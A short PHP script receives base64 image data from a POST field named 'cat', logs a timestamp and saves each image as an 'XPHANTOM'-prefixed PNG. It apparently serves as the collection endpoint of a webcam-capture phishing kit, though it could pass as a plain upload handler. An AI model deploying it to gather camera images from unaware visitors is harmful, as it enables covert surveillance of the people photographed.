<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" ."$date". "\r\n", 3, "log.txt");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'XPHANTOM-'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

